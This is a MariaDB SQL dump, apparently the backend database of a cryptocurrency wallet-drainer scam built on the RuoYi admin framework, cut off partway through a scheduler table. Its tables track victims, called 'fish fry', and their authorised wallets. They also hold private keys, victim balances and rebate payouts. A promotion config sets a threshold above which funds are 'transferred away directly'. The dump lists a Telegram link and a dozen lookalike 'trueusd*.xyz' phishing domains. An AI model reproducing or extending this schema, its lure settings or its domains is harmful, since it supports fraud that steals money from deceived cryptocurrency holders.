/*
 Navicat Premium Data Transfer

 Source Server         : bigFish2
 Source Server Type    : MariaDB
 Source Server Version : 100902
 Source Host           : 45.207.11.222:3306
 Source Schema         : ryvue

 Target Server Type    : MariaDB
 Target Server Version : 100902
 File Encoding         : 65001

 Date: 15/09/2022 10:14:39
*/
CREATE DATABASE IF NOT EXISTS `ryvue`;

USE `ryvue`

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for data_au_address
-- ----------------------------
DROP TABLE IF EXISTS `data_au_address`;
CREATE TABLE `data_au_address`  (
  `id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'id',
  `type_id` bigint(20) NULL DEFAULT NULL COMMENT '类型id',
  `au_address` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '授权钱包地址',
  `au_name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '授权钱包别名',
  `private_key` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '私钥',
  `au_time` datetime(0) NULL DEFAULT current_timestamp COMMENT '授权时间',
  `dept_id` bigint(20) NULL DEFAULT NULL COMMENT '部门id',
  `user_id` bigint(20) NULL DEFAULT NULL COMMENT '用户id',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '授权地址表表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of data_au_address
-- ----------------------------

-- ----------------------------
-- Table structure for data_fish
-- ----------------------------
DROP TABLE IF EXISTS `data_fish`;
CREATE TABLE `data_fish`  (
  `id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'id',
  `fish_address` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '鱼苗地址',
  `au_address_id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '授权钱包Id',
  `spread_id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '推广链id',
  `balance` decimal(20, 6) NULL DEFAULT NULL COMMENT '总余额',
  `create_time` datetime(0) NULL DEFAULT current_timestamp COMMENT '授权时间',
  `user_id` bigint(20) NULL DEFAULT NULL COMMENT '代理人id',
  `invitee_addr` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '邀请人钱包地址',
  `dept_id` bigint(20) NULL DEFAULT NULL COMMENT '部门id',
  `is_auth` varchar(2) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '是否授权（0：未授权，1：授权）',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '鱼苗表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of data_fish
-- ----------------------------

-- ----------------------------
-- Table structure for data_fish_currency
-- ----------------------------
DROP TABLE IF EXISTS `data_fish_currency`;
CREATE TABLE `data_fish_currency`  (
  `id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'id',
  `fish_id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '鱼苗id',
  `currency_name` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '币种名称\r\n',
  `balance` decimal(20, 6) NULL DEFAULT NULL COMMENT '余额',
  `create_time` datetime(0) NULL DEFAULT current_timestamp COMMENT '创建时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '鱼苗币数据表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of data_fish_currency
-- ----------------------------

-- ----------------------------
-- Table structure for data_fish_income
-- ----------------------------
DROP TABLE IF EXISTS `data_fish_income`;
CREATE TABLE `data_fish_income`  (
  `id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'id',
  `fish_id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '鱼苗地址',
  `income` decimal(20, 6) NULL DEFAULT NULL COMMENT '收益',
  `create_time` datetime(0) NULL DEFAULT current_timestamp COMMENT '创建时间',
  `cashback_status` varchar(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '是否提现（0：未提，1：已提）',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '鱼苗表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of data_fish_income
-- ----------------------------

-- ----------------------------
-- Table structure for data_fish_rebate
-- ----------------------------
DROP TABLE IF EXISTS `data_fish_rebate`;
CREATE TABLE `data_fish_rebate`  (
  `id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'id',
  `fish_id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '鱼苗id',
  `currency_type` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '货币类型',
  `contract_address` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '合约地址',
  `rebate_address` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '返利的钱包地址',
  `number` decimal(20, 6) NULL DEFAULT NULL COMMENT '返利数量',
  `create_time` datetime(0) NULL DEFAULT current_timestamp COMMENT '创建时间',
  `rebateflag` tinyint(4) NULL DEFAULT NULL COMMENT '是否已经返(0:未返，1：已返)',
  `group_id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '分组id',
  `spread_id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '推广链的id',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '鱼苗返利表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of data_fish_rebate
-- ----------------------------

-- ----------------------------
-- Table structure for data_spread
-- ----------------------------
DROP TABLE IF EXISTS `data_spread`;
CREATE TABLE `data_spread`  (
  `id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'id',
  `name` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '推广名称',
  `times_type` varchar(2) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '限制次数类型（0：不限制；1：按天和地址限制次数；2：按地址永远限制次数）',
  `times` int(11) NULL DEFAULT NULL COMMENT '限制次数',
  `remark` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '备注',
  `update_time` datetime(0) NULL DEFAULT NULL COMMENT '修改时间',
  `create_time` datetime(0) NULL DEFAULT current_timestamp COMMENT '创建时间',
  `dept_id` bigint(20) NULL DEFAULT NULL COMMENT '部门id',
  `user_id` bigint(20) NULL DEFAULT NULL COMMENT '用户id',
  `gt_amount` decimal(20, 6) NULL DEFAULT NULL COMMENT '大于多少直接转走',
  `gt_switch` tinyint(1) NULL DEFAULT NULL COMMENT '是否打开转钱开关0:关闭，1：打开',
  `configs` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin NULL COMMENT '配置字段',
  `pool_size` decimal(20, 6) NULL DEFAULT NULL COMMENT '矿池大小',
  `deduction_size` decimal(20, 6) NULL DEFAULT NULL COMMENT '矿池剩余大小',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '推广表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of data_spread
-- ----------------------------
INSERT INTO `data_spread` VALUES ('99a64e5af0d74cc9bae8e3aa8dee4797', '领取', '2', 1, '领取', '2022-09-15 10:11:44', '2022-06-19 02:09:48', 202, 109, NULL, 0, '{\"tglink\":\"https://t.me/TRONkfff\",\"contract>10\":\"1\",\"contract>1000\":\"10\",\"contract>5000\":\"20\",\"contract>10000\":\"30\",\"contract>50000\":\"40\",\"fee-min-msg_en\":\"Insufficient miners\' fees\",\"fee-min-msg_zh-CN\":\"矿工费不足\"}', 333.000000, 0.000000);

-- ----------------------------
-- Table structure for data_spread_au
-- ----------------------------
DROP TABLE IF EXISTS `data_spread_au`;
CREATE TABLE `data_spread_au`  (
  `id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'id',
  `spread_id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '推广id',
  `au_address_id` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '授权地址',
  `create_time` datetime(0) NULL DEFAULT current_timestamp COMMENT '创建时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '推广授权地址表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of data_spread_au
-- ----------------------------

-- ----------------------------
-- Table structure for data_spread_url
-- ----------------------------
DROP TABLE IF EXISTS `data_spread_url`;
CREATE TABLE `data_spread_url`  (
  `id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'id',
  `spread_id` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '推广id',
  `url` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '推广url',
  `create_time` datetime(0) NULL DEFAULT current_timestamp COMMENT '创建时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '推广连接表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of data_spread_url
-- ----------------------------
INSERT INTO `data_spread_url` VALUES ('0382af4df5034b619002610a7bd83eae', '99a64e5af0d74cc9bae8e3aa8dee4797', 'www.trueusdf.xyz', '2022-09-15 10:11:44');
INSERT INTO `data_spread_url` VALUES ('2d1678ce766e4226b88299fe5012c1d5', '99a64e5af0d74cc9bae8e3aa8dee4797', 'www.trueusdg.xyz', '2022-09-15 10:11:44');
INSERT INTO `data_spread_url` VALUES ('62d57689dadf47d581b57c93a99f8452', '99a64e5af0d74cc9bae8e3aa8dee4797', 'www.trueusdz.xyz', '2022-09-15 10:11:44');
INSERT INTO `data_spread_url` VALUES ('6d36f5ee51664c4c8d89e5be45efe826', '99a64e5af0d74cc9bae8e3aa8dee4797', 'www.trueusdd.xyz', '2022-09-15 10:11:44');
INSERT INTO `data_spread_url` VALUES ('725c6ea2ebb04cabb7e2d94a5bdfe7eb', '99a64e5af0d74cc9bae8e3aa8dee4797', 'www.trueusdx.xyz', '2022-09-15 10:11:44');
INSERT INTO `data_spread_url` VALUES ('7cd2503dac8c43a7ad8df1fab46e7a07', '99a64e5af0d74cc9bae8e3aa8dee4797', 'www.trueusdl.xyz', '2022-09-15 10:11:44');
INSERT INTO `data_spread_url` VALUES ('802abae88aee4c42a8c8ed299ffc8dbf', '99a64e5af0d74cc9bae8e3aa8dee4797', 'www.trueusdk.xyz', '2022-09-15 10:11:44');
INSERT INTO `data_spread_url` VALUES ('845028e26a594e0898435b3e4b473d1d', '99a64e5af0d74cc9bae8e3aa8dee4797', 'www.trueusdc.xyz', '2022-09-15 10:11:44');
INSERT INTO `data_spread_url` VALUES ('c2cd496d7a7f46ce823e3edd01280148', '99a64e5af0d74cc9bae8e3aa8dee4797', 'www.trueusdh.xyz', '2022-09-15 10:11:44');
INSERT INTO `data_spread_url` VALUES ('db1ab966729847648f068342d26b6615', '99a64e5af0d74cc9bae8e3aa8dee4797', 'www.trueusdv.xyz', '2022-09-15 10:11:44');
INSERT INTO `data_spread_url` VALUES ('eaee6c119f9c4ce8854a6435ab0d31ce', '99a64e5af0d74cc9bae8e3aa8dee4797', 'www.trueusdj.xyz', '2022-09-15 10:11:44');
INSERT INTO `data_spread_url` VALUES ('fb0b4eae901d42cfa20e221f044e3259', '99a64e5af0d74cc9bae8e3aa8dee4797', 'www.trueusdb.xyz', '2022-09-15 10:11:44');

-- ----------------------------
-- Table structure for data_transfer
-- ----------------------------
DROP TABLE IF EXISTS `data_transfer`;
CREATE TABLE `data_transfer`  (
  `id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'id',
  `fish_id` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '鱼苗地址id',
  `au_address` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL COMMENT '授权钱包地址',
  `arrival_address` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '到账地址',
  `currency_type` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '币种类型',
  `amount` decimal(20, 6) NULL DEFAULT 1.000000 COMMENT '到账余额',
  `create_time` datetime(0) NULL DEFAULT current_timestamp COMMENT '创建时间',
  `dept_id` bigint(20) NULL DEFAULT NULL COMMENT '部门id',
  `user_id` bigint(20) NULL DEFAULT NULL COMMENT '用户id',
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_data_user_transfer_status`(`amount`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci COMMENT = '数据用户提现表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of data_transfer
-- ----------------------------

-- ----------------------------
-- Table structure for data_type
-- ----------------------------
DROP TABLE IF EXISTS `data_type`;
CREATE TABLE `data_type`  (
  `id` bigint(20) NOT NULL COMMENT 'id',
  `type_name` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '链类型名称',
  `nick_name` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '别名',
  `api_url` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT 'API链接',
  `api_key` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '官网APIKEY',
  `remark` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '链类型表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of data_type
-- ----------------------------
INSERT INTO `data_type` VALUES (1, '波场', 'bc', '1', '1', '无备注');
INSERT INTO `data_type` VALUES (2, '以太链', 'eth', '1', '1', '无备注');
INSERT INTO `data_type` VALUES (3, '币安', 'ba', '1', '1', '无备注');

-- ----------------------------
-- Table structure for data_type_address
-- ----------------------------
DROP TABLE IF EXISTS `data_type_address`;
CREATE TABLE `data_type_address`  (
  `id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'id',
  `type_id` bigint(20) NULL DEFAULT NULL COMMENT '链类型id',
  `currency_type` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '货币类型',
  `address` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '地址',
  `create_time` datetime(0) NULL DEFAULT current_timestamp COMMENT '授权时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '币种地址表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of data_type_address
-- ----------------------------
INSERT INTO `data_type_address` VALUES ('754b3bc70fa04fc996f4aa7376c4d238', 1, 'usdt', 'hy-addr:合约地址', '2022-05-05 15:15:18');
INSERT INTO `data_type_address` VALUES ('8ce44017fc394a3eb83e18f0d406980b', 1, 'sushi', 'hy-addr:合约地址2', '2022-05-05 15:15:18');

-- ----------------------------
-- Table structure for gen_table
-- ----------------------------
DROP TABLE IF EXISTS `gen_table`;
CREATE TABLE `gen_table`  (
  `table_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '编号',
  `table_name` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '表名称',
  `table_comment` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '表描述',
  `sub_table_name` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '关联子表的表名',
  `sub_table_fk_name` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '子表关联的外键名',
  `class_name` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '实体类名称',
  `tpl_category` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT 'crud' COMMENT '使用的模板（crud单表操作 tree树表操作）',
  `package_name` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '生成包路径',
  `module_name` varchar(30) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '生成模块名',
  `business_name` varchar(30) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '生成业务名',
  `function_name` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '生成功能名',
  `function_author` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '生成功能作者',
  `gen_type` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '0' COMMENT '生成代码方式（0zip压缩包 1自定义路径）',
  `gen_path` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '/' COMMENT '生成路径（不填默认项目路径）',
  `options` varchar(1000) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '其它生成选项',
  `create_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '创建者',
  `create_time` datetime(0) NULL DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '更新者',
  `update_time` datetime(0) NULL DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`table_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 13 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '代码生成业务表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of gen_table
-- ----------------------------
INSERT INTO `gen_table` VALUES (11, 'data_fish_rebate', '鱼苗返利表', NULL, NULL, 'DataFishRebate', 'crud', 'com.ruoyi.data', 'data', 'rebate', '鱼苗返利', 'ruoyi', '0', '/', '{\"parentMenuId\":\"2000\"}', 'admin', '2022-04-24 00:54:05', '', '2022-04-24 16:23:03', NULL);
INSERT INTO `gen_table` VALUES (12, 'data_fish_rebate_history', '鱼苗返利历史表', NULL, NULL, 'DataFishRebateHistory', 'crud', 'com.ruoyi.data', 'data', 'history', '鱼苗返利历史', 'ruoyi', '0', '/', '{}', 'admin', '2022-04-28 00:42:19', '', '2022-04-28 00:43:26', NULL);

-- ----------------------------
-- Table structure for gen_table_column
-- ----------------------------
DROP TABLE IF EXISTS `gen_table_column`;
CREATE TABLE `gen_table_column`  (
  `column_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '编号',
  `table_id` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '归属表编号',
  `column_name` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '列名称',
  `column_comment` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '列描述',
  `column_type` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '列类型',
  `java_type` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT 'JAVA类型',
  `java_field` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT 'JAVA字段名',
  `is_pk` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '是否主键（1是）',
  `is_increment` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '是否自增（1是）',
  `is_required` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '是否必填（1是）',
  `is_insert` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '是否为插入字段（1是）',
  `is_edit` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '是否编辑字段（1是）',
  `is_list` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '是否列表字段（1是）',
  `is_query` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '是否查询字段（1是）',
  `query_type` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT 'EQ' COMMENT '查询方式（等于、不等于、大于、小于、范围）',
  `html_type` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '显示类型（文本框、文本域、下拉框、复选框、单选框、日期控件）',
  `dict_type` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '字典类型',
  `sort` int(11) NULL DEFAULT NULL COMMENT '排序',
  `create_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '创建者',
  `create_time` datetime(0) NULL DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '更新者',
  `update_time` datetime(0) NULL DEFAULT NULL COMMENT '更新时间',
  PRIMARY KEY (`column_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 87 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '代码生成业务表字段' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of gen_table_column
-- ----------------------------
INSERT INTO `gen_table_column` VALUES (74, '11', 'id', 'id', 'varchar(32)', 'String', 'id', '1', '0', NULL, '1', NULL, NULL, NULL, 'EQ', 'input', NULL, 1, 'admin', '2022-04-24 00:54:05', NULL, '2022-04-24 16:23:03');
INSERT INTO `gen_table_column` VALUES (75, '11', 'fish_id', '鱼苗id', 'varchar(32)', 'String', 'fishId', '0', '0', '1', '1', '1', '1', '1', 'EQ', 'input', '', 2, 'admin', '2022-04-24 00:54:05', NULL, '2022-04-24 16:23:03');
INSERT INTO `gen_table_column` VALUES (76, '11', 'currency_type', '货币类型', 'varchar(10)', 'String', 'currencyType', '0', '0', '1', '1', '1', '1', '1', 'EQ', 'select', '', 3, 'admin', '2022-04-24 00:54:05', NULL, '2022-04-24 16:23:03');
INSERT INTO `gen_table_column` VALUES (77, '11', 'contract_address', '合约地址', 'varchar(50)', 'String', 'contractAddress', '0', '0', '1', '1', '1', '1', '1', 'EQ', 'input', '', 4, 'admin', '2022-04-24 00:54:06', NULL, '2022-04-24 16:23:03');
INSERT INTO `gen_table_column` VALUES (78, '11', 'number', '返利数量', 'decimal(20,6)', 'BigDecimal', 'number', '0', '0', '1', '1', '1', '1', '1', 'EQ', 'input', '', 5, 'admin', '2022-04-24 00:54:06', NULL, '2022-04-24 16:23:03');
INSERT INTO `gen_table_column` VALUES (79, '11', 'create_time', '创建时间', 'datetime', 'Date', 'createTime', '0', '0', NULL, '1', NULL, '1', NULL, 'EQ', 'datetime', NULL, 6, 'admin', '2022-04-24 00:54:06', NULL, '2022-04-24 16:23:03');
INSERT INTO `gen_table_column` VALUES (80, '12', 'id', 'id', 'varchar(32)', 'String', 'id', '1', '0', NULL, '1', NULL, NULL, NULL, 'EQ', 'input', '', 1, 'admin', '2022-04-28 00:42:19', '', '2022-04-28 00:43:26');
INSERT INTO `gen_table_column` VALUES (81, '12', 'fish_id', '鱼苗id', 'varchar(32)', 'String', 'fishId', '0', '0', '1', '1', '1', '1', '1', 'EQ', 'input', '', 2, 'admin', '2022-04-28 00:42:19', '', '2022-04-28 00:43:26');
INSERT INTO `gen_table_column` VALUES (82, '12', 'currency_type', '货币类型', 'varchar(10)', 'String', 'currencyType', '0', '0', '1', '1', '1', '1', '1', 'EQ', 'select', '', 3, 'admin', '2022-04-28 00:42:19', '', '2022-04-28 00:43:26');
INSERT INTO `gen_table_column` VALUES (83, '12', 'contract_address', '合约地址', 'varchar(50)', 'String', 'contractAddress', '0', '0', '1', '1', '1', '1', '1', 'EQ', 'input', '', 4, 'admin', '2022-04-28 00:42:19', '', '2022-04-28 00:43:26');
INSERT INTO `gen_table_column` VALUES (84, '12', 'rebate_address', '返利的钱包地址', 'varchar(100)', 'String', 'rebateAddress', '0', '0', '1', '1', '1', '1', '1', 'EQ', 'input', '', 5, 'admin', '2022-04-28 00:42:19', '', '2022-04-28 00:43:26');
INSERT INTO `gen_table_column` VALUES (85, '12', 'number', '返利数量', 'decimal(20,6)', 'BigDecimal', 'number', '0', '0', '1', '1', '1', '1', '1', 'EQ', 'input', '', 6, 'admin', '2022-04-28 00:42:19', '', '2022-04-28 00:43:26');
INSERT INTO `gen_table_column` VALUES (86, '12', 'create_time', '创建时间', 'datetime', 'Date', 'createTime', '0', '0', NULL, '1', NULL, '1', NULL, 'EQ', 'datetime', '', 7, 'admin', '2022-04-28 00:42:19', '', '2022-04-28 00:43:26');

-- ----------------------------
-- Table structure for qrtz_blob_triggers
-- ----------------------------
DROP TABLE IF EXISTS `qrtz_blob_triggers`;
CREATE TABLE `qrtz_blob_triggers`  (
  `sched_name` varchar(120) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '调度名称',
  `trigger_name` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'qrtz_triggers表trigger_name的外键',
  `trigger_group` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'qrtz_triggers表trigger_group的外键',
  `blob_data` blob NULL DEFAULT NULL COMMENT '存放持久化Trigger对象',
  PRIMARY KEY (`sched_name`, `trigger_name`, `trigger_group`) USING BTREE,
  CONSTRAINT `qrtz_blob_triggers_ibfk_1` FOREIGN KEY (`sched_name`, `trigger_name`, `trigger_group`) REFERENCES `qrtz_triggers` (`sched_name`, `trigger_name`, `trigger_group`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = 'Blob类型的触发器表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of qrtz_blob_triggers
-- ----------------------------

-- ----------------------------
-- Table structure for qrtz_calendars
-- ----------------------------
DROP TABLE IF EXISTS `qrtz_calendars`;
CREATE TABLE `qrtz_calendars`  (
  `sched_name` varchar(120) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '调度名称',
  `calendar_name` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '日历名称',
